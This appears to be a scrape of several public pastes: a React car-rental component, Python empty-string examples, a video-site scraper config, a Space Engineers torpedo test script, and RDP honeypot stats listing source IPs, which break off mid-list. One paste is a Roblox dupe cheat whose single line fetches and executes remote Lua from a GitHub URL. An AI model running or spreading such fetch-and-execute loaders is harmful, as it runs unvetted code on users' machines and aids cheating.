            <div id=""cardResult"">
                <Container className=""container"">
                    {isLoading ? (
                        <h1>Loading...</h1>
                    ) : !isClick ? (
                        <Row className=""row justify-content-center"">
                            {data.map(car=>{
                                return (
                                    // <CarCard key={car.id} name={car.name} image={car.image} price={car.price} id={car.id} />
                                        <Fragment key={car.id}>
                                            <Col md=""4"" className=""col-md-4 m-0 p-0"">
                                                <Card className=""card card-result border-1"" style={{width: ""21rem""}}>
                                                    <img src={car.image} className=""card-img-top"" alt={car.name} />
                                                    <CardBody className=""card-body"">
                                                        <p className=""card-type"">{car.name}</p>
                                                        <CardTitle tag=""h5"" className=""card-title fw-bold"">{formatToIDR(car.price)} / hari</CardTitle>
                                                        <CardText className=""card-text"">Lorem ipsum dolor sit amet, consectetur adipiscing
                                                            elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua.</CardText>
                                                        <Button onClick={()=>handleClick(car.id)} className=""btn btn-primary w-100"">Pilih Mobil</Button>
                                                    </CardBody>
                                                </Card>
                                            </Col>
                                        </Fragment>
                                )
                            })}
                        </Row>
                    ) : (
                        <div id=""cardDetail"">
                            <Container className=""container"">
                                <Row className=""row justify-content-md-between flex-wrap"">
                                    <Col md=""8"" className=""col-md-8 m-md-0 p-md-0 detail-package"">
                                        <p className=""fw-bold text-capitalize ms-3 mt-2"">tentang paket</p>
                                        <p className=""fw-bold text-capitalize ms-3"">include</p>
                                        <ul>
                                            <li className=""text-secondary"">Apa saja yang termasuk dalam paket misal durasi max 12
                                                Jam
                                            </li>
                                            <li className=""text-secondary"">Sudah termasuk bensin selama 12 jam</li>
                                            <li className=""text-secondary"">Sudah termasuk Tiket wisata</li>
                                            <li className=""text-secondary"">Sudah termasuk pajak</li>
                                        </ul>
                                        <p className=""fw-bold text-capitalize ms-3"">exclude</p>
                                        <ul>
                                            <li className=""text-secondary"">Tidak termasuk biaya makan sopir Rp 75.000/hari</li>
                                            <li className=""text-secondary"">Jika overtime lebih dari 12 jam akan ada tambahan biaya
                                                Rp 20.000/jam
                                            </li>
                                            <li className=""text-secondary"">Tidak termasuk akomodasi penginapan</li>
                                        </ul>
                                        <p className=""fw-bold text-capitalize ms-3"">refund, reschedule, overtime</p>
                                        <ul>
                                            <li className=""text-secondary"">Tidak termasuk biaya makan sopir Rp 75.000/hari</li>
                                            <li className=""text-secondary"">Jika overtime lebih dari 12 jam akan ada tambahan biaya
                                                Rp 20.000/jam
                                            </li>
                                            <li className=""text-secondary"">Tidak termasuk akomodasi penginapan</li>
                                            <li className=""text-secondary"">Tidak termasuk biaya makan sopir Rp 75.000/hari</li>
                                            <li className=""text-secondary"">Jika overtime lebih dari 12 jam akan ada tambahan biaya
                                                Rp 20.000/jam
                                            </li>
                                            <li className=""text-secondary"">Tidak termasuk akomodasi penginapan</li>
                                            <li className=""text-secondary"">Tidak termasuk biaya makan sopir Rp 75.000/hari</li>
                                            <li className=""text-secondary"">Jika overtime lebih dari 12 jam akan ada tambahan biaya
                                                Rp 20.000/jam
                                            </li>
                                            <li className=""text-secondary"">Tidak termasuk akomodasi penginapan</li>
                                        </ul>
                                    </Col>
                                    <Col md=""4"" className=""col-md-4 m-md-0 p-md-0 car-detail justify-content-md-end"">
                                        <Card className=""card card-detail border-1"">
                                            <img src={detailData.image} className=""card-img-top"" alt=""...""/>
                                            <CardBody className=""card-body"">
                                                <CardTitle className=""card-type fw-bold fs-6 m-0 p-0"">{detailData.name}</CardTitle>
                                                <CardSubtitle className=""d-flex align-items-center m-0 p-0"">
                                                    <img src=""/img/ic_users.svg"" className=""pe-2"" alt=""""/>
                                                    <p className=""m-0 p-0 text-secondary fw-bold fs-6"">{detailData.category}</p>
                                                </CardSubtitle>
                                                <CardText className=""d-flex justify-content-between fw-bold mt-5 mb-3"">
                                                    <p className=""text-capitalize"">total</p>
                                                    <p>{formatToIDR(Number(detailData.price))}</p>
                                                </CardText>
                                            </CardBody>
                                        </Card>
                                    </Col>
                                </Row>
                            </Container>
                        </div>
                    )}
                </Container>
            </div>
        </>
    )
}"
19AmEfyY,MineColoniesPDA,nevermind967,Lua,Sunday 2nd of July 2023 10:48:39 PM CDT,"c = peripheral.wrap('bottom')
"
wjUYT70U,Verificar Si Una Variable de Tipo String Está Vacia en Python,NubeColectiva,Python,Sunday 2nd of July 2023 10:07:45 PM CDT,""""""" 
# Ejemplo 1
producto = ""Zapatos marrones de cuero"" 

if producto == """":
    print(""La variable está vacia"")
else:
    print(""La variable no está vacia"")
""""""

#Ejemplo 2

usuario = ""Carlos Torres""

if not usuario:
    print(""La variable esta vacia"")
else:
    print(""La variable no esta vacia"")
"
64WK874C,Arm Wrestle Simulator Script Roblox 2023 Dupe Pastebin Working Updated AWS Script,ToxinKindaScripts,Lua,Sunday 2nd of July 2023 08:55:25 PM CDT,"-- Arm Wrestle Simulator Script / AWS Script / Spririt Hub Arm Wrestle Sim Script
loadstring(game:HttpGet(""https://raw.githubusercontent.com/zicus-scripts/gay-scripts/main/Loader.lua""), true)()
-- Join the discord https://discord.gg/6KnEUHGsPp"
1YiF7imz,I0I,Damonwei,JSON,Sunday 2nd of July 2023 08:48:35 PM CDT,"{
""author"":""Dwei-0702"",
""ua"": ""Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.75 Safari/537.36"",
""homeUrl"": ""https://www.l0l.tv/"",
""cateManual"": { ""电视剧"": ""2"",""电影"": ""1"",""哔哩"": ""20"",""综艺"": ""3"",""动漫"": ""4""},
""homeVodNode"": ""//div[@class='pack-ykpack']/div[1]/a"",
""homeVodName"": ""/@title"",
""homeVodId"": ""/@href"",
""homeVodIdR"": """",
""homeVodImg"": ""/div/@data-original"",
""homeVodImgR"": ""\\S+(http\\S+)"",
""homeVodMark"": ""/span[4]/text()"",
""cateUrl"": ""https://www.l0l.tv/vodshow/{cateId}--------{catePg}---.html"",
""cateVodNode"": ""//div[@class='pack-ykpack']/div[1]/a"",
""cateVodName"": ""/@title"",
""cateVodId"": ""/@href"",
""cateVodIdR"": """",
""cateVodImg"": ""/div/@data-original"",
""cateVodImgR"": ""\\S+(http\\S+)"",
""cateVodMark"": ""/span[4]/text()"",
""dtUrl"":""https://www.l0l.tv{vid}"",
""dtNode"": ""//body"",
""dtName"": ""//h1/text()"",
""dtNameR"": """",
""dtImg"": ""//div[@class='s-cover box']/a/img/@src"",
""dtImgR"": """",
""dtCate"": ""//p[contains(@class,'item')][1]/a/text()"",
""dtCateR"": """",
""dtYear"": ""//p[contains(@class,'item')][2]/a/text()"",
""dtYearR"": """",
""dtArea"": ""//p[contains(@class,'item')][4]/a/text()"",
""dtAreaR"": """",
""dtMark"": """",
""dtMarkR"": """",
""dtActor"": ""concat(//p[contains(@class,'item')][6]/a/text())"",
""dtActorR"": """",
""dtDirector"": ""concat(//p[contains(@class,'item')][5]/a/text())"",
""dtDirectorR"": """",
""dtDesc"": ""concat('Dwei观影提示：资源播放失败可切换不同线路或点击快速搜索其他站点观看，有些线路存在广告请勿相信！！！简介：',//p[contains(@class,'item')][7]/span[2]/text())"",
""dtDescR"": """",
""dtFromNode"": ""//div[@id='tag']/div/a"",
""dtFromName"": ""/text()"",
""dtFromNameR"": """",
""dtUrlNode"": ""//div[contains(@class,'playlist_notfull')]"",
""dtUrlSubNode"": ""/ul/li/a"",
""dtUrlId"": ""@href"",
""dtUrlIdR"": """",
""dtUrlName"": ""/text()"",
""dtUrlNameR"": """",
""playUrl"":""https://www.l0l.tv{playUrl}"",
""searchUrl"":""https://www.l0l.tv/vodsearch/-------------.html?wd={wd}"",
""scVodNode"":""//div[contains(@class,'ec-search')]/ul/li/div[1]/div/a"",
""scVodName"":""/@title"",
""scVodId"":""/@href"",
""scVodImg"":""/div/@data-original"",
""scVodMark"":""/span[3]/text()""
}"
1suGnjq5,Summon Torpedo,klassekatze,C#,Sunday 2nd of July 2023 08:16:59 PM CDT,"/*
 * R e a d m e
 * -----------
 * 
 * SUMMON TORPEDO TESTING SCRIPT
 * 
 * Purpose: conveniently summoning specific numbers of torpedoes to attack your grid as needed in creative for testing PDCs or other defensive qualities.
 * 
 * 1. Put this script in a grid with torpedo launchers, power, and antenna.
 * 2. Give torpedo launchers to enemy, such as pirates. do not give program block, power, antenna away - those should remain owned by you.
 * 3. Add this script to another grid. in that other grid, run command ""fire X"" where X is a number. Observe as that other grid is shot by X number of torpedoes from the torpedo launcher grid.
 */

T getBlock<T>(Func<IMyTerminalBlock, bool> f = null) where T : class
{
	List<IMyTerminalBlock> blocks = new List<IMyTerminalBlock>();
	GridTerminalSystem.GetBlocksOfType<T>(blocks, f);
	return blocks.Count > 0 ? (T)blocks[0] : null;
}

IMyRadioAntenna a = null;

List<IMyTerminalBlock> weapons = new List<IMyTerminalBlock>();
WcPbApi api = null;

bool setup = false;
public Program()
{

	Runtime.UpdateFrequency = UpdateFrequency.Update1;
}
string _sharedSecret = ""shhhh"";
IMyBroadcastListener _broadcastListener;
string _broadcastTag = ""SBT_"";

int FIRE_NUM = 0;

void readMessages()
{
	while (_broadcastListener.HasPendingMessage)
	{
		MyIGCMessage myIGCMessage = _broadcastListener.AcceptMessage();
		if (myIGCMessage.Tag == _broadcastTag)
		{
			var d = myIGCMessage.Data;
			try
			{
				if (d != null)
				{
					if (d is MyTuple<long, int>)
					{
						var dat = (MyTuple<long, int>)d;

						api.SetAiFocus(Me,dat.Item1);
						FIRE_NUM = dat.Item2;

					}
				}
			}
			catch (Exception e)
			{
				Echo(e.ToString());
			}
		}
	}
}

void update()
{
	if (FIRE_NUM > 0)
	{
		foreach (var w in weapons)
		{
			if (api.IsWeaponReadyToFire(w))
			{
				var t = api.GetWeaponTarget(w);
				if(t.HasValue)
				{
					var tt = t.Value;
					if(tt.Type == MyDetectedEntityType.LargeGrid || tt.Type == MyDetectedEntityType.SmallGrid)
					{
						api.FireWeaponOnce(w);
						FIRE_NUM -= 1;
					}
				}
			}

			if (FIRE_NUM < 1) break;
		}
		a.CustomName = FIRE_NUM + "" torps queued"";
	}
}

void requestTorpedo(int num)
{
	if (a != null)
	{
		MyTuple<long, int> pkt = new MyTuple<long, int>(Me.CubeGrid.EntityId, num);
		IGC.SendBroadcastMessage(_broadcastTag, pkt);
		a.CustomName = num + "" torps requested"";
	}
}
public void Main(string argument, UpdateType updateSource)
{
	if(!setup)
	{
		setup = true;
		a = getBlock<IMyRadioAntenna>();
		a.Radius = 50000;
		api = new WcPbApi();
		api.Activate(Me);
		GridTerminalSystem.GetBlocksOfType<IMyTerminalBlock>(weapons, b => api.HasCoreWeapon(b));

		_broadcastTag += _sharedSecret;
		_broadcastListener = IGC.RegisterBroadcastListener(_broadcastTag);
		Echo(""setup complete, weapons: ""+ weapons.Count);
	}

	if(argument != """") Echo(""arg: "" + argument);
	try
	{
		readMessages();
		update();
		if (argument.StartsWith(""fire ""))
		{
			var num = int.Parse(argument.Split(' ')[1]);
			requestTorpedo(num);
			Echo(""requested "" + num);
		}
	}
	catch (Exception e)
	{
		Echo(e.ToString());
	}

}

}

public class WcPbApi
{
	public string[] WcBlockTypeLabels = new string[]
		{
			""Any"",
			""Offense"",
			""Utility"",
			""Power"",
			""Production"",
			""Thrust"",
			""Jumping"",
			""Steering""
		};

	private Action<ICollection<MyDefinitionId>> _getCoreWeapons;
	private Func<Sandbox.ModAPI.Ingame.IMyTerminalBlock, IDictionary<string, int>, bool> _getBlockWeaponMap;
	private Action<IMyTerminalBlock, IDictionary<MyDetectedEntityInfo, float>> _getSortedThreats;
	private Func<long, bool> _hasGridAi;
	//private Func<Sandbox.ModAPI.Ingame.IMyTerminalBlock, long, int, Vector3D?> _getPredictedTargetPos;
	//private Func<Sandbox.ModAPI.Ingame.IMyTerminalBlock, int, Sandbox.ModAPI.Ingame.MyDetectedEntityInfo> _getWeaponTarget;
	//private Action<ICollection<MyDefinitionId>> _getCoreTurrets;
	private Func<long, int, Sandbox.ModAPI.Ingame.MyDetectedEntityInfo> _getAiFocus;
	private Func<Sandbox.ModAPI.Ingame.IMyTerminalBlock, long, int, bool> _setAiFocus;
	private Action<Sandbox.ModAPI.Ingame.IMyTerminalBlock, bool, bool, int> _toggleWeaponFire;
	private Func<Sandbox.ModAPI.Ingame.IMyTerminalBlock, bool> _hasCoreWeapon;
	private Action<Sandbox.ModAPI.Ingame.IMyTerminalBlock, ICollection<Sandbox.ModAPI.Ingame.MyDetectedEntityInfo>> _getObstructions;
	private Func<Sandbox.ModAPI.Ingame.IMyTerminalBlock, ICollection<string>, int, bool> _getTurretTargetTypes;
	private Action<Sandbox.ModAPI.Ingame.IMyTerminalBlock, ICollection<string>, int> _setTurretTargetTypes;
	private Func<Sandbox.ModAPI.Ingame.IMyTerminalBlock, long, int, Vector3D?> _getPredictedTargetPos;

	private Func<Sandbox.ModAPI.Ingame.IMyTerminalBlock, int, Matrix> _getWeaponAzimuthMatrix;
	private Func<Sandbox.ModAPI.Ingame.IMyTerminalBlock, int, Matrix> _getWeaponElevationMatrix;
	private Func<Sandbox.ModAPI.Ingame.IMyTerminalBlock, long, int, MyTuple<bool, Vector3D?>> _isTargetAlignedExtended;
	private Func<Sandbox.ModAPI.Ingame.IMyTerminalBlock, int, string> _getActiveAmmo;
	private Action<Sandbox.ModAPI.Ingame.IMyTerminalBlock, int, string> _setActiveAmmo;
	private Func<long, float> _getConstructEffectiveDps;
	private Func<Sandbox.ModAPI.Ingame.IMyTerminalBlock, int, Sandbox.ModAPI.Ingame.MyDetectedEntityInfo> _getWeaponTarget;
	private Action<Sandbox.ModAPI.Ingame.IMyTerminalBlock, long, int> _setWeaponTarget;

	private Action<Sandbox.ModAPI.Ingame.IMyTerminalBlock, int, Action<long, int, ulong, long, Vector3D, bool>> _monitorProjectile;
	private Action<Sandbox.ModAPI.Ingame.IMyTerminalBlock, int, Action<long, int, ulong, long, Vector3D, bool>> _unMonitorProjectile;
	private Func<ulong, MyTuple<Vector3D, Vector3D, float, float, long, string>> _getProjectileState;
	private Func<long, MyTuple<bool, int, int>> _getProjectilesLockedOn;

	private Action<Sandbox.ModAPI.Ingame.IMyTerminalBlock, bool, int> _fireWeaponOnce;
	private Func<Sandbox.ModAPI.Ingame.IMyTerminalBlock, int, bool, bool, bool> _isWeaponReadyToFire;
	private Func<Sandbox.ModAPI.Ingame.IMyTerminalBlock, int, float> _getMaxWeaponRange;
	private Func<Sandbox.ModAPI.Ingame.IMyTerminalBlock, int, MyTuple<Vector3D, Vector3D>> _getWeaponScope;
	private Func<Sandbox.ModAPI.Ingame.IMyTerminalBlock, float> _currentPowerConsumption;

	public bool Activate(IMyTerminalBlock pbBlock)
	{
		var dict = pbBlock.GetProperty(""WcPbAPI"")?.As<IReadOnlyDictionary<string, Delegate>>().GetValue(pbBlock);
		if (dict == null) throw new Exception(""WcPbAPI failed to activate"");
		return ApiAssign(dict);
	}

	public bool ApiAssign(IReadOnlyDictionary<string, Delegate> delegates)
	{
		if (delegates == null)
			return false;
		AssignMethod(delegates, ""GetCoreWeapons"", ref _getCoreWeapons);
		AssignMethod(delegates, ""GetBlockWeaponMap"", ref _getBlockWeaponMap);
		AssignMethod(delegates, ""GetSortedThreats"", ref _getSortedThreats);
		AssignMethod(delegates, ""GetObstructions"", ref _getObstructions);
		AssignMethod(delegates, ""HasGridAi"", ref _hasGridAi);
		AssignMethod(delegates, ""GetAiFocus"", ref _getAiFocus);
		AssignMethod(delegates, ""SetAiFocus"", ref _setAiFocus);
		AssignMethod(delegates, ""HasCoreWeapon"", ref _hasCoreWeapon);
		AssignMethod(delegates, ""GetPredictedTargetPosition"", ref _getPredictedTargetPos);
		AssignMethod(delegates, ""GetTurretTargetTypes"", ref _getTurretTargetTypes);
		AssignMethod(delegates, ""SetTurretTargetTypes"", ref _setTurretTargetTypes);
		AssignMethod(delegates, ""GetWeaponAzimuthMatrix"", ref _getWeaponAzimuthMatrix);
		AssignMethod(delegates, ""GetWeaponElevationMatrix"", ref _getWeaponElevationMatrix);
		AssignMethod(delegates, ""IsTargetAlignedExtended"", ref _isTargetAlignedExtended);
		AssignMethod(delegates, ""GetActiveAmmo"", ref _getActiveAmmo);
		AssignMethod(delegates, ""SetActiveAmmo"", ref _setActiveAmmo);
		AssignMethod(delegates, ""GetConstructEffectiveDps"", ref _getConstructEffectiveDps);
		AssignMethod(delegates, ""GetWeaponTarget"", ref _getWeaponTarget);
		AssignMethod(delegates, ""SetWeaponTarget"", ref _setWeaponTarget);
		AssignMethod(delegates, ""MonitorProjectile"", ref _monitorProjectile);
		AssignMethod(delegates, ""UnMonitorProjectile"", ref _unMonitorProjectile);
		AssignMethod(delegates, ""GetProjectileState"", ref _getProjectileState);
		AssignMethod(delegates, ""GetProjectilesLockedOn"", ref _getProjectilesLockedOn);

		AssignMethod(delegates, ""FireWeaponOnce"", ref _fireWeaponOnce);
		AssignMethod(delegates, ""ToggleWeaponFire"", ref _toggleWeaponFire);
		AssignMethod(delegates, ""IsWeaponReadyToFire"", ref _isWeaponReadyToFire);
		AssignMethod(delegates, ""GetMaxWeaponRange"", ref _getMaxWeaponRange);
		AssignMethod(delegates, ""GetWeaponScope"", ref _getWeaponScope);

		AssignMethod(delegates, ""GetCurrentPower"", ref _currentPowerConsumption);
		return true;
	}
	private void AssignMethod<T>(IReadOnlyDictionary<string, Delegate> delegates, string name, ref T field) where T : class
	{
		if (delegates == null)
		{
			field = null;
			return;
		}
		Delegate del;
		if (!delegates.TryGetValue(name, out del))
			throw new Exception($""{GetType().Name} :: Couldn't find {name} delegate of type {typeof(T)}"");
		field = del as T;
		if (field == null)
			throw new Exception(
				$""{GetType().Name} :: Delegate {name} is not type {typeof(T)}, instead it's: {del.GetType()}"");
	}

	public void GetAllCoreWeapons(ICollection<MyDefinitionId> collection) => _getCoreWeapons?.Invoke(collection);
	public void GetSortedThreats(IMyTerminalBlock pbBlock, IDictionary<MyDetectedEntityInfo, float> collection) =>
		_getSortedThreats?.Invoke(pbBlock, collection);
	public bool HasGridAi(long entity) => _hasGridAi?.Invoke(entity) ?? false;
	//public Vector3D? GetPredictedTargetPosition(Sandbox.ModAPI.Ingame.IMyTerminalBlock weapon, long targetEnt, int weaponId) =>_getPredictedTargetPos?.Invoke(weapon, targetEnt, weaponId) ?? null;
	// public MyDetectedEntityInfo? GetWeaponTarget(Sandbox.ModAPI.Ingame.IMyTerminalBlock weapon, int weaponId = 0) => _getWeaponTarget?.Invoke(weapon, weaponId);
	//public void GetAllCoreTurrets(ICollection<MyDefinitionId> collection) => _getCoreTurrets?.Invoke(collection);
	public MyDetectedEntityInfo? GetAiFocus(long shooter, int priority = 0) => _getAiFocus?.Invoke(shooter, priority);

	public bool SetAiFocus(Sandbox.ModAPI.Ingame.IMyTerminalBlock pBlock, long target, int priority = 0) =>
		_setAiFocus?.Invoke(pBlock, target, priority) ?? false;

	public void ToggleWeaponFire(Sandbox.ModAPI.Ingame.IMyTerminalBlock weapon, bool on, bool allWeapons, int weaponId = 0) =>
		_toggleWeaponFire?.Invoke(weapon, on, allWeapons, weaponId);
	public bool HasCoreWeapon(Sandbox.ModAPI.Ingame.IMyTerminalBlock weapon) => _hasCoreWeapon?.Invoke(weapon) ?? false;

	public void GetObstructions(Sandbox.ModAPI.Ingame.IMyTerminalBlock pBlock, ICollection<Sandbox.ModAPI.Ingame.MyDetectedEntityInfo> collection) =>
		_getObstructions?.Invoke(pBlock, collection);

	public Vector3D? GetPredictedTargetPosition(Sandbox.ModAPI.Ingame.IMyTerminalBlock weapon, long targetEnt, int weaponId) =>
		_getPredictedTargetPos?.Invoke(weapon, targetEnt, weaponId) ?? null;

	public Matrix GetWeaponAzimuthMatrix(Sandbox.ModAPI.Ingame.IMyTerminalBlock weapon, int weaponId) =>
		_getWeaponAzimuthMatrix?.Invoke(weapon, weaponId) ?? Matrix.Zero;

	public Matrix GetWeaponElevationMatrix(Sandbox.ModAPI.Ingame.IMyTerminalBlock weapon, int weaponId) =>
		_getWeaponElevationMatrix?.Invoke(weapon, weaponId) ?? Matrix.Zero;

	public MyTuple<bool, Vector3D?> IsTargetAlignedExtended(Sandbox.ModAPI.Ingame.IMyTerminalBlock weapon, long targetEnt, int weaponId) =>
		_isTargetAlignedExtended?.Invoke(weapon, targetEnt, weaponId) ?? new MyTuple<bool, Vector3D?>();
	public string GetActiveAmmo(Sandbox.ModAPI.Ingame.IMyTerminalBlock weapon, int weaponId) =>
		_getActiveAmmo?.Invoke(weapon, weaponId) ?? null;

	public void SetActiveAmmo(Sandbox.ModAPI.Ingame.IMyTerminalBlock weapon, int weaponId, string ammoType) =>
		_setActiveAmmo?.Invoke(weapon, weaponId, ammoType);

	public float GetConstructEffectiveDps(long entity) => _getConstructEffectiveDps?.Invoke(entity) ?? 0f;

	public MyDetectedEntityInfo? GetWeaponTarget(Sandbox.ModAPI.Ingame.IMyTerminalBlock weapon, int weaponId = 0) =>
		_getWeaponTarget?.Invoke(weapon, weaponId);

	public void SetWeaponTarget(Sandbox.ModAPI.Ingame.IMyTerminalBlock weapon, long target, int weaponId = 0) =>
		_setWeaponTarget?.Invoke(weapon, target, weaponId);

	public void MonitorProjectileCallback(Sandbox.ModAPI.Ingame.IMyTerminalBlock weapon, int weaponId, Action<long, int, ulong, long, Vector3D, bool> action) =>
		_monitorProjectile?.Invoke(weapon, weaponId, action);

	public void UnMonitorProjectileCallback(Sandbox.ModAPI.Ingame.IMyTerminalBlock weapon, int weaponId, Action<long, int, ulong, long, Vector3D, bool> action) =>
		_unMonitorProjectile?.Invoke(weapon, weaponId, action);

	//// POs, Dir, baseDamageLeft, HealthLeft, TargetEntityId, AmmoName
	public MyTuple<Vector3D, Vector3D, float, float, long, string> GetProjectileState(ulong projectileId) =>
		_getProjectileState?.Invoke(projectileId) ?? new MyTuple<Vector3D, Vector3D, float, float, long, string>();

	public bool GetBlockWeaponMap(Sandbox.ModAPI.Ingame.IMyTerminalBlock weaponBlock, IDictionary<string, int> collection) =>
		_getBlockWeaponMap?.Invoke(weaponBlock, collection) ?? false;

	public MyTuple<bool, int, int> GetProjectilesLockedOn(long victim) =>
		_getProjectilesLockedOn?.Invoke(victim) ?? new MyTuple<bool, int, int>();

	public void FireWeaponOnce(Sandbox.ModAPI.Ingame.IMyTerminalBlock weapon, bool allWeapons = true, int weaponId = 0) =>
			_fireWeaponOnce?.Invoke(weapon, allWeapons, weaponId);


	public bool IsWeaponReadyToFire(Sandbox.ModAPI.Ingame.IMyTerminalBlock weapon, int weaponId = 0, bool anyWeaponReady = true,
		bool shootReady = false) =>
		_isWeaponReadyToFire?.Invoke(weapon, weaponId, anyWeaponReady, shootReady) ?? false;

	public float GetMaxWeaponRange(Sandbox.ModAPI.Ingame.IMyTerminalBlock weapon, int weaponId) =>
		_getMaxWeaponRange?.Invoke(weapon, weaponId) ?? 0f;

	public MyTuple<Vector3D, Vector3D> GetWeaponScope(Sandbox.ModAPI.Ingame.IMyTerminalBlock weapon, int weaponId) =>
		_getWeaponScope?.Invoke(weapon, weaponId) ?? new MyTuple<Vector3D, Vector3D>();
	public float GetCurrentPower(Sandbox.ModAPI.Ingame.IMyTerminalBlock weapon) => _currentPowerConsumption?.Invoke(weapon) ?? 0f;"
q1bXM4Vn,2023-07-02_stats.json,rdp_snitch,JSON,Sunday 2nd of July 2023 07:18:13 PM CDT,"{
  ""ip"": {
    ""69.58.124.234"": 135,
    ""192.99.110.133"": 21,
    ""125.74.93.228"": 159,
    ""139.59.28.233"": 6,
    ""150.230.79.119"": 60,
    ""114.217.18.245"": 87,
    ""120.71.0.5"": 81,
    ""197.40.141.234"": 6,
    ""20.42.101.211"": 129,
    ""185.66.228.185"": 66,
    ""46.10.214.186"": 78,
    ""92.204.139.79"": 141,
    ""36.108.169.132"": 102,
    ""45.227.254.54"": 6,
    ""87.251.75.145"": 9,
    ""201.93.165.53"": 12,
    ""120.132.17.153"": 24,
    ""168.138.149.190"": 45,
    ""185.208.181.244"": 27,
    ""43.134.180.137"": 60,
    ""178.21.163.70"": 30,
    ""164.92.158.134"": 12,
    ""43.154.166.116"": 24,
    ""190.93.152.18"": 9,
    ""31.43.185.32"": 24,
    ""43.156.229.114"": 18,
    ""45.227.254.8"": 6,
    ""191.101.174.106"": 3,
    ""87.251.75.120"": 3,
    ""39.104.21.190"": 27,
    ""116.96.77.183"": 12,
    ""62.122.184.166"": 12,
    ""62.122.184.168"": 12,
    ""43.153.216.55"": 3,
    ""185.190.24.101"": 3,
    ""178.32.170.30"": 6,
    ""45.119.81.119"": 18,
    ""103.195.236.213"": 18,
    ""167.248.133.50"": 3,
    ""194.165.16.37"": 6,
    ""14.225.206.43"": 3,
    ""45.79.84.94"": 3,
    ""87.251.64.110"": 6,
    ""167.99.250.229"": 3,
    ""66.175.222.230"": 30,
    ""36.138.171.119"": 3,
    ""45.227.254.49"": 3,
    ""198.235.24.186"": 9,
    ""185.170.144.3"": 6,
    ""152.89.198.133"": 6,
    ""176.113.115.184"": 12,
    ""154.26.128.19"": 3,
    ""116.47.111.114"": 3,
    ""194.26.135.176"": 9,
    ""194.165.16.10"": 6,
    ""62.122.184.165"": 6,
    ""198.235.24.98"": 9
  },
  ""asn"": {
    ""AS32899"": 135,
    ""AS16276"": 27,
    ""AS141998"": 159,
    ""AS14061"": 21,
    ""AS31898"": 105,
    ""AS4134"": 87,
    ""AS137695"": 183,
    ""AS8452"": 6,
    ""AS8075"": 129,
    ""AS201689"": 66,
    ""AS8866"": 78,
    ""AS398108"": 141,
    ""AS267784"": 15,
    ""AS208091"": 12,
    ""AS27699"": 12,
    ""AS140292"": 24,
    ""AS48147"": 27,
    ""AS132203"": 105,
    ""AS21419"": 30,
    ""AS19429"": 9,
    ""AS211736"": 24,
    ""AS32780"": 3,
    ""AS37963"": 27,
    ""AS7552"": 12,
    ""AS57523"": 45,
    ""AS211632"": 3,
    ""AS131386"": 18,
    ""AS140827"": 18,
    ""AS398722"": 3,
    ""AS48721"": 12,
    ""AS135905"": 3,
    ""AS63949"": 33,
    ""AS48080"": 12,
    ""AS9808"": 3,
    ""AS396982"": 18,
    ""AS57678"": 12,
    ""AS141995"": 3,
    ""AS17858"": 3
  },
  ""isp"": {
    ""Bresco Broadband"": 135,
    ""OVH SAS"": 21,
    ""China Telecom"": 159,
    ""DigitalOcean"": 6,
    ""Oracle Corporation"": 105,
    ""Chinanet"": 87,
    ""CHINATELECOM Xinjiang Wulumuqi MAN network"": 183,
    ""TE Data"": 6,
    ""Microsoft Corporation"": 129,
    ""Lamerd Information & Communication Technology Co., ltd"": 66,
    ""Vivacom Bulgaria EAD"": 78,
    ""GoDaddy.com, LLC"": 141,
    ""Flyservers S.A."": 27,
    ""XHOST-INTERNET-SOLUTIONS"": 12,
    ""Vivo"": 12,
    ""Addresses CNNIC"": 24,
    ""Amin IDC"": 27,
    ""Aceville Pte.ltd"": 63,
    ""Pishtaze E Jadid Infomration Company"": 30,
    ""DigitalOcean, LLC"": 15,
    ""Shenzhen Tencent Computer Systems Company Limited"": 42,
    ""ETB - Colombia"": 9,
    ""FOP Dmytro Nedilskyi"": 24,
    ""Hosting Services"": 3,
    ""Hangzhou Alibaba Advertising Co"": 27,
    ""Viettel Corporation"": 12,
    ""Chang Way Technologies Co. Limited"": 45,
    ""Internet Solutions & Innovations LTD."": 3,
    ""OVH ISP"": 6,
    ""Long Van System Solution"": 18,
    ""AZ Viet NAM Communications Technology Company Limited"": 18,
    ""Censys, Inc."": 3,
    ""VNPT"": 3,
    ""Akamai Technologies, Inc."": 33,
    ""Dmitriy Panchenko"": 12,
    ""China Mobile"": 3,
    ""Google LLC"": 18,
    ""Cat Technologies Co. Limited"": 12,
    ""Cogent Communications"": 3,
    ""LG POWERCOMM"": 3
  },
  ""org"": {
    ""Bresco Broadband"": 135,
    ""AVAST Software"": 21,
    ""Chinanet GS"": 159,
    ""DigitalOcean, LLC"": 21,
    ""Oracle Cloud Infrastructure (sa-saopaulo-1)"": 105,
    ""Chinanet JS"": 87,
    ""Chinanet XJ"": 81,
    ""Unknown"": 375,
    ""Microsoft Azure Cloud (eastus)"": 129,
    ""Bulgarian Telecommunications Company Plc"": 78,
    ""Chinanet ZJ"": 102,
    ""UAB Host Baltic"": 15,
    ""Xhost Internet Solutions"": 18,
    ""TELEF\ufffdNICA BRASIL S.A"": 12,
    ""Tencent Cloud Computing"": 42,
    ""ETB - Colombia"": 9,
    ""FOP Dmytro Nedilskyi"": 24,
    ""Express Technologies Ltd"": 3,
    ""Aliyun Computing Co., LTD"": 27,
    ""Viettel Group"": 12,
    ""Chang Way Technologies Co. Limited"": 39,
    ""Tribeka Web Advisors S.A"": 3,
    ""Novotea network"": 6,
    ""DULIEUAZ"": 18,
    ""Censys, Inc."": 3,
    ""Flyservers S.A"": 12,
    ""Vietnam Posts and Telecommunications Group"": 3,
    ""Linode"": 33,
    ""China Mobile Communications Corporation"": 3,
    ""Palo Alto Networks, Inc"": 18,
    ""Xhostis"": 6,
    ""Starcrecium Limited"": 6,
    ""Cat Technologies Co. Limited"": 12,
    ""Contabo Asia Private LTD"": 3,
    ""Xpeed"": 3
  },
  ""regionName"": {
    ""Ohio"": 135,
    ""Quebec"": 21,
    ""Gansu"": 159,
    ""Karnataka"": 6,
    ""Sao Paulo"": 117,
    ""Jiangsu"": 87,
    ""Xinjiang Uyghur Autonomous Region"": 81,
    ""Giza"": 6,
    ""Virginia"": 270,
    ""Tehran"": 96,
    ""Sofia-Capital"": 78,
    ""Zhejiang"": 102,
    ""Vilnius"": 15,
    ""North Holland"": 30,
    ""Beijing"": 51,
    ""Qom Province"": 27,
    ""North West"": 81,
    ""Central and Western District"": 24,
    ""Bogota D.C."": 9,
    ""Kyiv City"": 24,
    ""New Jersey"": 3,
